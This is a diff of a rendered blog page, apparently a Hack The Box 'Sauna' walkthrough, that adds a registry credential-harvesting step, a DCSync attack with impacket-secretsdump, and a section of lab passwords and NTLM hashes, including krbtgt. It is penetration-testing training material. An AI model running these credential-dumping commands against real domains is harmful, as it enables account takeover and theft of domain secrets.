@@ -186,6 +186,16 @@
         
             
                 <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/sauna-box/" title="./walkthroughs/sauna-box/">
+                        
+                            Sauna HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
                     <a href="http://localhost:1313/walkthroughs/active-box/" title="./walkthroughs/active-box/">
                         
                             Active HTB Walkthrough
@@ -633,7 +643,7 @@
                         class="readtime"
                         title="Time to Read">
                         <i class="bi bi-clock"></i>
-                        15 mins to read
+                        17 mins to read
                     </div>
                 
             </div>
@@ -691,9 +701,9 @@
                         </a>
                     
                         <a
-                            href="/tags/kerberoastig/"
+                            href="/tags/kerberoasting/"
                             class="tag-btn">
-                            Kerberoastig
+                            Kerberoasting
                         </a>
                     
                         <a
@@ -781,7 +791,7 @@
       <ul>
         <li><a href="#enumerating-as-fsmith">Enumerating as fsmith:</a></li>
         <li><a href="#enumerating-users-and-groups-on-the-domain-using-impacket-lookupsid">Enumerating Users &amp; Groups on the domain using impacket-lookupsid:</a></li>
-        <li><a href="#using-smbclient">Using smbclient to enumerate shares:</a></li>
+        <li><a href="#using-smbclient">Using smbclient:</a></li>
         <li><a href="#kerberoasting-hsmith">Kerberoasting hsmith:</a></li>
         <li><a href="#cracking-hsmith-s-password-with-hashcat">Cracking hsmith&rsquo;s password with hashcat:</a></li>
         <li><a href="#enumerating-as-hsmith">Enumerating as hsmith:</a></li>
@@ -792,13 +802,14 @@
     </li>
     <li><a href="#3-dot-privilege-escalation">3. Privilege Escalation:</a>
       <ul>
-        <li><a href="#discovering-the-host-is-susceptible-to-printnightmare-vulnerabllity">Discovering the host is susceptible to printnightmare vulnerabllity:</a></li>
+        <li><a href="#privilege-escalation-route-1-printnightmare">Privilege escalation Route 1 PrintNightmare:</a></li>
+        <li><a href="#privilege-escalation-route-2-svc-loanmgr">Privilege escalation Route 2 svc_loanmgr:</a></li>
       </ul>
     </li>
     <li><a href="#4-dot-ownership">4. Ownership:</a>
       <ul>
-        <li><a href="#creating-a-new-administrator-user-using-cve-2021-1675--printnightmare-exploit">Creating a new administrator user using CVE-2021-1675 (printnightmare exploit):</a></li>
-        <li><a href="#connecting-as-our-new-local-admin-user">Connecting as our new local-admin user:</a></li>
+        <li><a href="#privilege-escalation-route-1-printnightmare">Privilege escalation Route 1 PrintNightmare:</a></li>
+        <li><a href="#privilege-escalation-route-2-svc-loanmgr">Privilege escalation Route 2 svc_loanmgr:</a></li>
       </ul>
     </li>
     <li><a href="#5-dot-persistence">5. Persistence:</a>
@@ -814,6 +825,15 @@
       </ul>
     </li>
     <li><a href="#sign-off">Sign off:</a></li>
+    <li><a href="#9c69d6"><del>CREDS</del>:</a>
+      <ul>
+        <li><a href="#compiled-usernames-passwords-and-hashes">Compiled Usernames, Passwords &amp; Hashes:</a></li>
+        <li><a href="#ssh-keys">SSH Keys:</a></li>
+      </ul>
+    </li>
+    <li><a href="#done">Done <!-- raw HTML omitted -->[4/5]<!-- raw HTML omitted --></a></li>
+    <li><a href="#check-rico-share"><!-- raw HTML omitted -->DONE<!-- raw HTML omitted --> check rico share</a></li>
+    <li><a href="#add-lnk-or-something-to-write-share-dot"><!-- raw HTML omitted -->DONE<!-- raw HTML omitted --> Add lnk or something to write share.</a></li>
   </ul>
 </nav>
         
@@ -828,7 +848,7 @@
 </ul>
 <h2 id="sauna-hack-the-box-walkthrough-writeup">Sauna Hack The Box Walkthrough/Writeup:</h2>
 <ul>
-<li><a href="https://app.hackthebox.com/machines/Sauna">https://app.hackthebox.com/machines/Sauna</a></li>
+<li><a href="https://app.hackthebox.com/machines/Suana">https://app.hackthebox.com/machines/Suana</a></li>
 </ul>
 <h2 id="how-i-use-variables-and-wordlists">How I use variables &amp; Wordlists:</h2>
 <ul>
@@ -1121,7 +1141,7 @@
 <li>The functionality level determines the minimum version of Windows server that can be used for a DC.
 <ul>
 <li>
-<p>+Note+: that any host os can be used on <strong>workstations</strong>, however the functionality level determines what the minimum version for DC&rsquo;s and the forest.</p>
+<p><del>Note</del>: that any host os can be used on <strong>workstations</strong>, however the functionality level determines what the minimum version for DC&rsquo;s and the forest.</p>
 </li>
 <li>
 <p><a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels">https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels</a></p>
@@ -1185,7 +1205,7 @@
   </tbody>
 </table>
 <ul>
-<li>+Note+:
+<li><del>Note</del>:
 <ul>
 <li>Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest.</li>
 <li>As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers.</li>
@@ -1247,7 +1267,7 @@
 </figure>
 
 <ul>
-<li>+Note+: This is a type-o it should say <code>SAUNA</code> I corrected this later. Always copy and paste!</li>
+<li><del>Note</del>: This is a type-o it should say <code>SAUNA</code> I corrected this later. Always copy and paste!</li>
 </ul>
 </li>
 </ul>
@@ -1275,7 +1295,7 @@
 <li>Since Kerberos is enabled on this host, it&rsquo;s best practice to sync our clock with the host’s. This helps avoid issues from clock misalignment, which can cause false negatives in Kerberos exploitation attempts.
 <ul>
 <li><code>sudo ntpdate -s $domain</code></li>
-<li>+Note+: I am doing this now as we have the DNS name etc.</li>
+<li><del>Note</del>: I am doing this now as we have the DNS name etc.</li>
 </ul>
 </li>
 </ul>
@@ -1362,7 +1382,7 @@
 </ul>
 <h3 id="smb-445">SMB <code>445</code>:</h3>
 <ul>
-<li>+Important note on methodology+: If you&rsquo;re wondering why I am still enumerating for null sessions, web, etc when I have cracked a hash, it&rsquo;s because there could still be some interesting findings and low-hanging fruit. Boxes are great as they train us and help us hone our skills, but businesses want all findings not just the most serious. It&rsquo;s good practice to treat boxes like an engagement. I you want to jump ahead, go to the foothold section.</li>
+<li><del>Important note on methodology</del>: If you&rsquo;re wondering why I am still enumerating for null sessions, web, etc when I have cracked a hash, it&rsquo;s because there could still be some interesting findings and low-hanging fruit. Boxes are great as they train us and help us hone our skills, but businesses want all findings not just the most serious. It&rsquo;s good practice to treat boxes like an engagement. I you want to jump ahead, go to the foothold section.</li>
 </ul>
 <h4 id="attempting-to-connect-with-null-and-guest-sessions">Attempting to connect with NULL &amp; Guest sessions:</h4>
 <ul>
@@ -1589,20 +1609,20 @@
 </ul>
 </li>
 </ul>
-<h3 id="using-smbclient">Using smbclient to enumerate shares:</h3>
+<h3 id="using-smbclient">Using smbclient:</h3>
 <ul>
 <li>
-<p><code>print$</code> <strong>share enumeration</strong>:</p>
+<p><code>print$</code> <strong>share enumaration</strong>:</p>
 <ul>
 <li><code>smbclient -U $user &quot;\\\\$box\\print$&quot;</code></li>
 <li><figure><img src="/ox-hugo/2024-11-03-103843_.png">
 </figure>
 </li>
-<li>+Note+: This appears to be a standard printer share. I will leave this for the moment and come back to it later if needed.</li>
+<li><del>Note</del>: This appears to be a standard printer share. I will leave this for the moment and come back to it later if needed.</li>
 </ul>
 </li>
 <li>
-<p><code>NETLOGON</code> <strong>share enumeration</strong>:</p>
+<p><code>NETLOGON</code> <strong>share enumaration</strong>:</p>
 </li>
 <li>
 <p><code>smbclient -U $user &quot;\\\\$box\\NETLOGON&quot;</code></p>
@@ -1614,7 +1634,7 @@
 </ul>
 </li>
 <li>
-<p><code>SYSVOL</code> <strong>share enumeration</strong>:</p>
+<p><code>SYSVOL</code> <strong>share enumaration</strong>:</p>
 <ul>
 <li><code>smbclient -U $user &quot;\\\\$box\\SYSVOL&quot;</code></li>
 <li>Scripts dir is empty:
@@ -1626,11 +1646,10 @@
 </li>
 </ul>
 </li>
-<li>
-<p><code>Ricoh</code> <strong>share enumeration</strong>:</p>
-</li>
-<li>
-<p><code>smbclient -U $user &quot;\\\\$box\\RICOH Aficio SP 8300DN PCL 6&quot;</code></p>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li><code>smbclient -U $user &quot;\\\\$box\\RICOH Aficio SP 8300DN PCL 6&quot;</code>
 <ul>
 <li><figure><img src="/ox-hugo/2024-11-03-110017_.png">
 </figure>
@@ -1733,16 +1752,106 @@
 </li>
 </ul>
 <h2 id="3-dot-privilege-escalation">3. Privilege Escalation:</h2>
-<h3 id="discovering-the-host-is-susceptible-to-printnightmare-vulnerabllity">Discovering the host is susceptible to printnightmare vulnerabllity:</h3>
+<h3 id="privilege-escalation-route-1-printnightmare">Privilege escalation Route 1 PrintNightmare:</h3>
+<h4 id="discovering-the-host-is-susceptible-to-printnightmare-vulnerability">Discovering the host is susceptible to PrintNightmare vulnerability:</h4>
 <ul>
 <li><code>netexec smb $box -u $user -p $pass -M printnightmare</code></li>
 <li><figure><img src="/ox-hugo/2024-11-03-155445_.png">
 </figure>
 </li>
-<li>+Note+: I have a priv-esc checklist that I run through when I am working on machines and checking for <code>printnightmare</code> is one of these checks (I didn&rsquo;t just magically stumble upon the idea). However now we have a viable path forward.</li>
+<li><del>Note</del>: I have a priv-esc checklist that I run through when I am working on machines and checking for <code>printnightmare</code> is one of these checks (I didn&rsquo;t just magically stumble upon the idea). However now we have a viable path forward.</li>
+</ul>
+<h3 id="privilege-escalation-route-2-svc-loanmgr">Privilege escalation Route 2 svc_loanmgr:</h3>
+<ul>
+<li>There is also the option of this other privesc path (and I believe intended approach)</li>
+</ul>
+<h4 id="approach-1-using-winpeas-to-find-clear-text-creds-stored-in-registry-keys">Approach 1: Using winpeas to find clear-text creds stored in Registry Keys:</h4>
+<ul>
+<li>
+<p><strong>I upload</strong> <code>winpeas.ps1</code> <strong>via my evil-winrm session as</strong> <code>fsmith</code>:</p>
+</li>
+<li>
+<p><strong>Running it we find that there are creds available for</strong> <code>win-logon</code> <strong>which are stored in clear-text</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-03-200441_.png">
+</figure>
+</li>
+<li><del>Note</del>: That the default username is <code>svc_loanmanager</code> however there is not user with that name on this machine. However there is a <code>svc_loanmgr</code>:</li>
+</ul>
+</li>
+<li>
+<p><strong>Verifying the credentials work for</strong> <code>svc_loanmgr</code>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-04-073359_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="approach-2-manually-enumerating-registry-keys-for-valuable-information">Approach 2: Manually Enumerating Registry Keys for Valuable Information:</h4>
+<ul>
+<li><strong>We can also search for these manually using</strong>:
+<ul>
+<li><code>reg query &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</code></li>
+<li><figure><img src="/ox-hugo/2024-11-03-200725_.png">
+</figure>
+</li>
+<li><del>Note</del>: Direct registry access may trigger logging events or alerts, especially if policies are in place.</li>
+</ul>
+</li>
+</ul>
+<h4 id="discovering-svc-loanmgr-has-dc-sync-privileges">Discovering svc_loanmgr has DC-Sync privileges:</h4>
+<ul>
+<li><strong>Looking back in bloodhound we can see our user has</strong> <code>GetChangesAll</code> <strong>&amp;</strong> <code>GetChanges</code> <strong>over the root domain object</strong>:
+<ul>
+<li>
+<figure><img src="/ox-hugo/2024-11-04-073716_.png">
+</figure>
+
+</li>
+<li>
+<p>Looking at the attack paths we have with <code>GetChangesAll</code> we can see we can:</p>
+<blockquote>
+<p>You may perform a dcsync attack to get the password hash of an arbitrary principal using impacket&rsquo;s secretsdump.py example script:</p>
+</blockquote>
+<ul>
+<li>This means we can perform a dcsync attack to get the hashes.</li>
+<li><figure><img src="/ox-hugo/2024-11-04-074029_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="overview-of-these-rights">Overview of these rights:</h4>
+<h5 id="replicating-directory-change--getchanges">Replicating Directory Change (GetChanges):</h5>
+<ul>
+<li><strong>Display Name</strong>: <a href="https://learn.microsoft.com/en-gb/windows/win32/adschema/r-ds-replication-get-changes">Replicating Directory Changes</a></li>
+<li><strong>Common Name</strong>: <code>DS-Replication-Get-Changes</code>, <code>GetChanges</code></li>
+<li><strong>Rights GUID Value</strong>: <code>1131f6aa-9c07-11d1-f79f-00c04fc2dcd2</code></li>
+<li><strong>Interpretation</strong>: Required to replicate changes from a given NC (Naming Context).
+<ul>
+<li><strong>To perform a DCSync attack, this extended right and</strong> <code>DS-Replication-Get-Changes-All</code> <strong>(below)</strong> <del>are required</del>.</li>
+</ul>
+</li>
+<li><strong>In bloodhound displayed as</strong>: <code>GetChanges</code></li>
+</ul>
+<h5 id="replicating-directory-changes-all--getchangesall">Replicating Directory Changes All (GetChangesAll):</h5>
+<ul>
+<li><strong>Display Name</strong>: <a href="https://learn.microsoft.com/en-gb/windows/win32/adschema/r-ds-replication-get-changes-all">Replicating Directory Changes All</a></li>
+<li><strong>Common Name</strong>: <code>DS-Replication-Get-Changes-All</code>, <code>GetChangesAll</code></li>
+<li><strong>Rights GUID Value</strong>: <code>1131f6ad-9c07-11d1-f79f-00c04fc2dcd2</code></li>
+<li><strong>Interpretation</strong>: Allows the replication of secret domain data.
+<ul>
+<li><strong>To perform a DCSync attack, this extended right and</strong> <code>DS-Replication-Get-Changes</code> <strong>(above)</strong> <del>are required</del>.</li>
+</ul>
+</li>
+<li><strong>In bloodhound displayed as</strong>: <code>GetChangesAll</code></li>
 </ul>
 <h2 id="4-dot-ownership">4. Ownership:</h2>
-<h3 id="creating-a-new-administrator-user-using-cve-2021-1675--printnightmare-exploit">Creating a new administrator user using CVE-2021-1675 (printnightmare exploit):</h3>
+<h3 id="privilege-escalation-route-1-printnightmare">Privilege escalation Route 1 PrintNightmare:</h3>
+<h4 id="creating-a-new-administrator-user-using-cve-2021-1675--printnightmare-exploit">Creating a new administrator user using CVE-2021-1675 (PrintNightmare exploit):</h4>
 <ol>
 <li>
 <p><strong>Download POC</strong>:</p>
@@ -1797,7 +1906,7 @@
 </ul>
 </li>
 </ol>
-<h3 id="connecting-as-our-new-local-admin-user">Connecting as our new local-admin user:</h3>
+<h4 id="connecting-as-our-new-local-admin-user">Connecting as our new local-admin user:</h4>
 <ul>
 <li>
 <p><strong>I connect usin</strong> <code>evil-winrm</code></p>
@@ -1813,6 +1922,19 @@
 <li><figure><img src="/ox-hugo/2024-11-03-160321_.png">
 </figure>
 </li>
+</ul>
+</li>
+</ul>
+<h3 id="privilege-escalation-route-2-svc-loanmgr">Privilege escalation Route 2 svc_loanmgr:</h3>
+<h4 id="performing-a-dc-sync-attack-as-svc-loanmgr">Performing a DC-SYNC attack as svc_loanmgr:</h4>
+<ul>
+<li><strong>We perform the dc-sync attack using</strong> <code>svc_loanmgr</code> <strong>account and</strong> <code>impacket-secretsdump</code>:
+<ul>
+<li><code>impacket-secretsdump $domain/$user:$pass@$box -dc-ip $box</code></li>
+<li><figure><img src="/ox-hugo/2024-11-04-074618_.png">
+</figure>
+</li>
+<li>All of the same steps can be peformed to create a golden ticket in the persistence section now etc.</li>
 </ul>
 </li>
 </ul>
@@ -1922,6 +2044,163 @@
 <p>Until next time, hack the planet!</p>
 <p>– Bloodstiller</p>
 <p>– Get in touch bloodstiller at proton dot me</p>
+<h2 id="9c69d6"><del>CREDS</del>:</h2>
+<h3 id="compiled-usernames-passwords-and-hashes">Compiled Usernames, Passwords &amp; Hashes:</h3>
+<h4 id="usernames">Usernames:</h4>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="Administrator%0aGuest%0akrbtgt%0aAdmin%0ahsmith%0afsmith%0asvc_loanmgr">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Administrator
+</span></span><span style="display:flex;"><span>Guest
+</span></span><span style="display:flex;"><span>krbtgt
+</span></span><span style="display:flex;"><span>Admin
+</span></span><span style="display:flex;"><span>hsmith
+</span></span><span style="display:flex;"><span>fsmith
+</span></span><span style="display:flex;"><span>svc_loanmgr</span></span></code></pre></div>
+    
+</div>
+<h4 id="passwords">Passwords:</h4>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="Thestrokes23%0aMoneymakestheworldgoround!">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Thestrokes23
+</span></span><span style="display:flex;"><span>Moneymakestheworldgoround!</span></span></code></pre></div>
+    
+</div>
+<h4 id="email-names">Email Names:</h4>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="hsmith@EGOTISTICAL-BANK.LOCAL%0afsmith@EGOTISTICAL-BANK.LOCAL">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>hsmith@EGOTISTICAL-BANK.LOCAL
+</span></span><span style="display:flex;"><span>fsmith@EGOTISTICAL-BANK.LOCAL</span></span></code></pre></div>
+    
+</div>
+<h4 id="username-and-pass">Username &amp; Pass:</h4>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"></code></pre></div>
+    
+</div>
+<h4 id="hashes">Hashes:</h4>
+<ul>
+<li><strong>Extract all hashes from netexec</strong>
+<ul>
+<li><strong>Extract only enabled hashes</strong>:
+<ul>
+<li><code>grep -iv disabled /home/kali/.nxc/logs/*.ntds | cut -d ':' -f2,5 --output-delimiter=' ' | awk '{print $2, $1}'</code></li>
+</ul>
+</li>
+<li><strong>Extract all hashes</strong>
+<ul>
+<li><code>cat /home/kali/.nxc/logs/*.ntds | cut -d ':' -f1,2,4 --output-delimiter=' ' | awk '{print $3, $2, $1}'</code></li>
+<li><del>Note</del>: We need to include disabled hashes to get the krbtgt hash in this method as that account is disabled by default.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="823452073d75b9d1cf70ebdf86c7f98e%20500%20Administrator%0a31d6cfe0d16ae931b73c59d7e0c089c0%20501%20Guest%0a3a885b81238c9ddec8d0fa07a002eddb%201000%20SAUNA$%0a4a8899428cad97676ff802229e466e2c%20502%20krbtgt%0a58a52d36c84fb7f5f1beab9a201db1dd%201103%20EGOTISTICAL-BANK.LOCAL%5cHSmith%0a58a52d36c84fb7f5f1beab9a201db1dd%201105%20EGOTISTICAL-BANK.LOCAL%5cFSmith%0a9cb31797c39a9b170b04058ba2bba48c%201108%20EGOTISTICAL-BANK.LOCAL%5csvc_loanmgr%0a657cc99ace25cc19c7d2902f26fb826d%204601%20bloodstiller">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>823452073d75b9d1cf70ebdf86c7f98e 500 Administrator
+</span></span><span style="display:flex;"><span>31d6cfe0d16ae931b73c59d7e0c089c0 501 Guest
+</span></span><span style="display:flex;"><span>3a885b81238c9ddec8d0fa07a002eddb 1000 SAUNA$
+</span></span><span style="display:flex;"><span>4a8899428cad97676ff802229e466e2c 502 krbtgt
+</span></span><span style="display:flex;"><span>58a52d36c84fb7f5f1beab9a201db1dd 1103 EGOTISTICAL-BANK.LOCAL\HSmith
+</span></span><span style="display:flex;"><span>58a52d36c84fb7f5f1beab9a201db1dd 1105 EGOTISTICAL-BANK.LOCAL\FSmith
+</span></span><span style="display:flex;"><span>9cb31797c39a9b170b04058ba2bba48c 1108 EGOTISTICAL-BANK.LOCAL\svc_loanmgr
+</span></span><span style="display:flex;"><span>657cc99ace25cc19c7d2902f26fb826d 4601 bloodstiller</span></span></code></pre></div>
+    
+</div>
+<h3 id="ssh-keys">SSH Keys:</h3>
+<h2 id="done">Done <!-- raw HTML omitted -->[4/5]<!-- raw HTML omitted --></h2>
+<ul>
+<li><input checked="" disabled="" type="checkbox"> secretsdump</li>
+<li><input checked="" disabled="" type="checkbox"> description fields</li>
+<li><input checked="" disabled="" type="checkbox"> password re-use for all users</li>
+<li><input checked="" disabled="" type="checkbox"> can&rsquo;t list content of ricoh</li>
+<li><input disabled="" type="checkbox"> </li>
+</ul>
+<h2 id="check-rico-share"><!-- raw HTML omitted -->DONE<!-- raw HTML omitted --> check rico share</h2>
+<ul>
+<li>State &ldquo;DONE&rdquo;       from &ldquo;TODO&rdquo;       <!-- raw HTML omitted --><!-- raw HTML omitted -->[2024-11-03 Sun 16:03]<!-- raw HTML omitted --><!-- raw HTML omitted --></li>
+</ul>
+<h2 id="add-lnk-or-something-to-write-share-dot"><!-- raw HTML omitted -->DONE<!-- raw HTML omitted --> Add lnk or something to write share.</h2>
+<ul>
+<li>State &ldquo;DONE&rdquo;       from &ldquo;TODO&rdquo;       <!-- raw HTML omitted --><!-- raw HTML omitted -->[2024-11-03 Sun 16:03]<!-- raw HTML omitted --><!-- raw HTML omitted --></li>
+</ul>
 
             
         </div>
@@ -1979,7 +2258,7 @@
                 <li>
                     
                         Word Count:
-                        3014
+                        3506
                     
                 </li>
             
